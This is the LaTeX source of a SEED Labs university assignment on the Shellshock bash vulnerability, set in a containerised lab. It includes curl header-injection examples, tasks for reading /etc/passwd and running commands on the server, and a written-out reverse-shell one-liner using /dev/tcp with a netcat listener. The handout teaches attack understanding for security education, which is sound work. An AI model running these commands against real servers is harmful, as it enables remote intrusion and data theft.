%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}
\newcommand{\webcommon}{../Web_Common}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website. }

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend too much on our SEED VM. You can do this lab
using other VMs or physical machines. }







\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}






\newcommand{\bash}{{\tt bash}\xspace}
\newcommand{\Bash}{{\tt Bash}\xspace}

\lhead{\bfseries SEED Labs -- Shellshock Attack Lab}

\begin{document}

\begin{center}
{\LARGE Shellshock Attack Lab}
\end{center}

\seedlabcopyright{2006 - 2016}

\section{Overview}

On September 24, 2014, a severe vulnerability in bash was identified.
Nicknamed Shellshock, this vulnerability can exploit many systems and be
launched either remotely or from a local machine.  In this
lab, students need to work on this attack, so they can understand the
Shellshock vulnerability. The learning objective of this lab is for students to get a
first-hand experience on this interesting attack, understand how it
works, and think about the lessons that we can get out of this
attack. The first version of this lab was developed on September 29, 2014, 
just five days after the attack was reported. It was assigned to the students 
in our Computer Security class on September 30, 2014. An important mission
of the SEED project is to quickly turn real attacks 
into educational materials, so instructors can bring them into their
classrooms in a timely manner and keep their students engaged with what
happens in the real world. This lab covers the following topics:

\begin{itemize}[noitemsep]
\item Shellshock
\item Environment variables 
\item Function definition in bash
\item Apache and CGI programs
\end{itemize}


\paragraph{Readings and videos.}
Detailed coverage of the Shellshock attack can be found in the following:

\begin{itemize}
\item Chapter 3 of the SEED Book, \seedbook
\item Section 3 of the SEED Lecture at Udemy, \seedcsvideo
\end{itemize}


\paragraph{Lab environment.} \seedenvironmentB \nodependency



% *******************************************
% SECTION
% *******************************************
\section{Environment Setup} 



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{DNS Setting}

In our setup, the web server container's IP address is
\texttt{10.9.0.80}. The hostname of the server is called
\texttt{www.seedlab-shellshock.com}. We need to map
this name to the IP address. Please add the following
to \texttt{/etc/hosts}. You need to use the root privilege
to modify this file: 

\begin{lstlisting}
10.9.0.80       www.seedlab-shellshock.com
\end{lstlisting}
 


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Container Setup and Commands}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Please download the
\texttt{Labsetup.zip} file to your VM from the lab's website,
unzip it, enter the \texttt{Labsetup} folder, and 
use the \texttt{docker-compose.yml} file to 
set up the lab environment. Detailed explanation
of the content in this file and all the involved 
\texttt{Dockerfile} can be found from the 
user manual, which is linked to the website of this lab.
If this is the first time you set up a SEED lab environment
using containers, it is very important that you read 
the user manual. 

In the following, we list some of the commonly
used commands related to Docker and Compose. 
Since we are going to use 
these commands very frequently, we have created aliases for them
in the \texttt{.bashrc} file (in our provided SEEDUbuntu 20.04 VM).


\begin{lstlisting}
$ docker-compose build  # Build the container image
$ docker-compose up     # Start the container
$ docker-compose down   # Shut down the container

// Aliases for the Compose commands above
$ dcbuild       # Alias for: docker-compose build
$ dcup          # Alias for: docker-compose up
$ dcdown        # Alias for: docker-compose down
\end{lstlisting}


All the containers will be running in the background. To run
commands on a container, we often need to get a shell on
that container. We first need to use the \texttt{"docker ps"}  
command to find out the ID of the container, and then
use \texttt{"docker exec"} to start a shell on that 
container. We have created aliases for them in
the \texttt{.bashrc} file.

\begin{lstlisting}
$ dockps        # Alias for: docker ps --format "{{.ID}}  {{.Names}}" 
$ docksh <id>   # Alias for: docker exec -it <id> /bin/bash

# The following example shows how to get a shell inside hostC
$ dockps
b1004832e275  hostA-10.9.0.5
0af4ea7a3e2e  hostB-10.9.0.6
9652715c8e0a  hostC-10.9.0.7

$ docksh 96
root@9652715c8e0a:/#  

# Note: If a docker command requires a container ID, you do not need to 
#       type the entire ID string. Typing the first few characters will 
#       be sufficient, as long as they are unique among all the containers. 
\end{lstlisting}


If you encounter problems when setting up the lab environment, 
please read the ``Common Problems'' section of the manual
for potential solutions.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Web Server and CGI}

In this lab, we will launch a Shellshock attack on the web server container. 
Many web servers enable CGI, which is a standard method used to generate
dynamic content on web pages and for web applications. Many CGI programs are
shell scripts, so before the actual CGI program runs,
a shell program will be invoked first, and such an invocation is
triggered by users from remote computers. If the shell program is
a vulnerable bash program, we can exploit the Shellshock vulnerable to
gain privileges on the server.


In our web server container, we have already set up a very simple CGI
program (called \texttt{vul.cgi}). 
It simply prints out {\tt "Hello World"} using a shell script.
The CGI program is put inside Apache's default CGI folder \texttt{/usr/lib/cgi-bin},
and it must be executable. 

\begin{lstlisting}[caption=\texttt{vul.cgi}] 
(*@\textbf{\#!/bin/bash\_shellshock}@*)          

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
\end{lstlisting}

The CGI program uses \texttt{/bin/bash\_shellshock} (the first line),
instead of using \texttt{/bin/bash}. This line specifies
what shell program should be invoked to run the script. We do need to use
the vulnerable bash in this lab.


To access the CGI program from the Web, we can either use a browser by
typing the following URL: \url{http://www.seedlab-shellshock.com/cgi-bin/vul.cgi}, 
or use the following command line program {\tt curl} to do the same thing. Please 
make sure that the web server container is running.

\begin{lstlisting}
$ curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
\end{lstlisting}


% *******************************************
% SECTION
% ******************************************* 
\section{Lab Tasks}

Detailed guidelines on the Shellshock attack can be found in the SEED book, so we will not 
repeat the guidelines in the lab description. 

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 1: Experimenting with Bash Function}


The bash program in Ubuntu 20.04 has already been patched, so it is no
longer vulnerable to the Shellshock attack. For the purpose of this lab, we
have installed a vulnerable version of bash inside the container (inside \texttt{/bin}). 
The program can also be found in the \texttt{Labsetup} folder (inside \texttt{image\_www}). 
Its name is \texttt{bash\_shellshock}. We need to use 
this bash in our task. You can run this shell program either in the 
container or directly on your computer. 
The container manual is linked to the lab's website. 

Please design an experiment to verify whether this bash is
vulnerable to the Shellshock attack or not. 
Conduct the same experiment on the patched version 
\texttt{/bin/bash} and report your observations.


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2: Passing Data to Bash via Environment Variable}


To exploit a Shellshock vulnerability in a bash-based CGI program, attackers need to 
pass their data to the vulnerable bash program, and the data need to be
passed via an environment variable. In this task, we need to see how we can
achieve this goal. We have provided another CGI program (\texttt{getenv.cgi}) on the 
server to help you identify what user data can get into the environment
variables of a CGI program. This CGI program prints out all
its environment variables. 


\begin{lstlisting}[caption=\texttt{getenv.cgi}]
#!/bin/bash_shellshock             

echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ            (*@\ding{192}@*)
\end{lstlisting}

\paragraph{Task 2.A: Using brower.}
In the code above, Line \ding{192} prints out the contents of all the
environment variables in the current process. Normally, you would see something 
like the following if you use a browser to access the CGI program. Please 
identify which environment variable(s)' values are set by the browser.
You can turn on the HTTP Header Live extension on your browser to 
capture the HTTP request, and compare the request with the 
environment variables printed out by the server. Please include your 
investigation results in the lab report.

\begin{lstlisting}
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) ...
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9, ...
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
...
\end{lstlisting}

 
\paragraph{Task 2.A: Using \texttt{curl}}
If we want to set the environment variable data to arbitrary values,
we will have to modify the behavior of the browser, that will be too complicated. 
Fortunately, there is a command-line tool called \texttt{curl}, which allows 
users to to control most of fields in an HTTP request. Here are some 
of the userful options: (1) the \texttt{-v} field can print out the header 
of the HTTP request; (2) the \texttt{-A}, \texttt{-e}, and 
\texttt{-H} options can set some fields in the header request, and
you need to figure out what fileds are set by each of them. 
Please include your findings in the lab report. 
Here are the examples on how to use these fields:
 

\begin{lstlisting}
$ curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
$ curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
$ curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
$ curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
\end{lstlisting}
 
Based on this experiment, please describe what options of \texttt{curl} 
can be used to inject data into the environment variables of 
the target CGI program. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 3: Launching the Shellshock Attack}

We can now launch the Shellshock attack. 
The attack does not depend on what is in the CGI program, as it targets
the bash program, which is invoked before the actual CGI script is
executed. Your job is to launch the attack through the URL
\url{http://www.seedlab-shellshock.com/cgi-bin/vul.cgi}, so you can
get the server to run an arbitrary command. 


If your command has a plain-text output, and you want the output returned to you,
your output needs to follow a protocol: it should start with 
\texttt{Content\_type: text/plain}, followed by an empty line, and then
you can place your plain-text output. For example, if you want the
server to return a list of files in its folder, your command  
will look like the following: 

\begin{lstlisting}
echo Content_type: text/plain; echo; /bin/ls -l
\end{lstlisting}
 

In this task, please use three different approaches (i.e., three different HTTP header fields)
to launch the Shellshock attack against the target CGI program. You need to achieve 
the following objectives. For each objective, you only need to use one approach,
but in total, you need to use three different approaches. 

\begin{itemize}
\item Task 3.A: Get the server to send back the content of the \texttt{/etc/passwd} file. 

\item Task 3.B: Get the server to tell you its process' user ID. You can use 
the \texttt{/bin/id} command to print out the ID information. 

\item Task 3.C: Get the server to create a file inside the \texttt{/tmp} folder. You need to 
get into the container to see whether the file is created or not, or use 
another Shellshock attack to list the \texttt{/tmp} folder.

\item Task 3.D: Get the server to delete the file that you just created 
inside the \texttt{/tmp} folder. 
\end{itemize} 


\paragraph{Questions.} Please answer the following questions:
\begin{itemize}
\item Question 1: Will you be able to steal the content of 
the shadow file \texttt{/etc/shadow} from the server? Why or why not?  
The information obtained in Task 3.B should give you a clue. 

\item Question 2: HTTP GET requests typically attach data in the URL, 
after the \texttt{?} mark. This could be another 
approach that we can use to launch the attack. In the following example,
we attach some data in the URL, and we found that the data are used to set
the following environment variable: 

\begin{lstlisting}
$ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA"
...
UERY_STRING=AAAAA
...
\end{lstlisting}

Can we use this method to launch the Shellshock attack? Please conduct your 
experiment and derive your conclusions based on your experiment results. 
     
\end{itemize}

  


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 4: Getting a Reverse Shell via Shellshock Attack}

The Shellshock vulnerability allows attacks to run arbitrary commands on
the target machine. In real attacks, instead of hard-coding the command 
in the attack, attackers often choose to run a shell
command, so they can use this shell to run other commands,
for as long as the shell program is alive. 
To achieve this goal, attackers need to run a reverse shell.

Reverse shell is a shell process started on a machine, with its input and output being
controlled by somebody from a remote computer. Basically, the shell runs
on the victim's machine, but it takes input from the attacker machine and
also prints its output on the attacker's machine. Reverse shell
gives attackers a convenient way to run commands on a compromised machine. 
Detailed explanation of how to create a reverse shell can be found in 
the SEED book. We also summarize the explanation in
Section~\ref{shellshock:sec:reverseshell}.
In this task, you need to demonstrate 
how you can get a reverse shell from the victim using the Shellshock attack. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 5: Using the Patched Bash}

Now, let us use a bash program that has already been patched.
The program \texttt{/bin/bash} is a patched version.
Please replace the first line of 
the CGI programs with this program. 
Redo Task 3 and describe your observations. 


% *******************************************
% SECTION
% ******************************************* 
\section{Guidelines: Creating Reverse Shell}
\label{shellshock:sec:reverseshell}



%\section{Guidelines: Creating Reverse Shell}
%\label{shellshock:sec:reverseshell}


The key idea of reverse shell is to redirect its standard input, output, and error devices to a
network connection, so the shell gets its input from the connection, and prints out its output
also to the connection. At the other end of the connection is a program run by the
attacker; the program simply displays whatever comes from the shell at the other end,
and sends whatever is typed by the attacker to the shell, over the network connection.

A commonly used program by attackers is
\texttt{netcat}, which, if running
with the \texttt{"-l"} option, becomes a TCP server that listens for a connection on the
specified port. This server program basically prints out whatever is sent by the client, and
sends to the client whatever is typed by the user running the server.
In the following experiment, \texttt{netcat} (\texttt{nc} for short) is used
to listen for a connection on port \texttt{9090}~(let us focus only on the first line).


\begin{lstlisting}
Attacker(10.0.2.6):$ nc -nv -l 9090  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
Listening on 0.0.0.0 9090
Connection received on 10.0.2.5 39452
Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
Server(10.0.2.5):$ ifconfig
ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet (*@\textbf{10.0.2.5}@*)  netmask 255.255.255.0  broadcast 10.0.2.255
        ...
\end{lstlisting}


The above \texttt{nc} command will block, waiting for a connection.
We now directly run the following bash program on the Server machine~(\texttt{10.0.2.5}) to emulate
what attackers would run after compromising the server via the Shellshock attack.
This bash command will trigger a
TCP connection to the attacker machine's port 9090, and a reverse shell will be created. We can
see the shell prompt from the above result, indicating that the shell is running on the Server
machine; we can type the \texttt{ifconfig} command to verify that the IP address is indeed
\texttt{10.0.2.5}, the one belonging to the Server machine.  Here is the bash command:

\begin{lstlisting}
Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
\end{lstlisting}

The above command represents the one that would normally be executed on a compromised server.
It is quite complicated, and we give a detailed explanation in the following:


\begin{itemize}
\item \texttt{"/bin/bash -i"}: The option \texttt{i} stands for interactive, meaning that the shell must be
  interactive (must provide a shell prompt).

\item \texttt{"> /dev/tcp/10.0.2.6/9090"}: This causes the output device~(\texttt{stdout}) of the shell
  to be redirected to the TCP connection to \texttt{10.0.2.6}'s port \texttt{9090}.
  In \unix systems, \texttt{stdout}'s file descriptor is \texttt{1}.

\item \texttt{"0<\&1"}: File descriptor \texttt{0} represents the standard input device~(\texttt{stdin}).
  This option tells the system to use the standard output device as the stardard input device.
  Since \texttt{stdout} is already redirected to the TCP connection, this option basically
  indicates that the shell program will get its input from the same TCP connection.

\item \texttt{"2>\&1"}: File descriptor \texttt{2} represents the standard error \texttt{stderr}. This
  causes the error output to be redirected to \texttt{stdout}, which is the TCP connection.
\end{itemize}

In summary, the command \texttt{"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<\&1 2>\&1"} starts a
\texttt{bash} shell on the server machine, with its input coming from a TCP connection,
and output going to the same TCP connection.
In our experiment, when the \texttt{bash}
shell command is executed on \texttt{10.0.2.5}, it connects back to the \texttt{netcat} process
started on \texttt{10.0.2.6}. This is confirmed via the \texttt{"Connection from 10.0.2.5 ..."}
message displayed by \texttt{netcat}.









% *******************************************
% SECTION
% ******************************************* 
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\end{document}

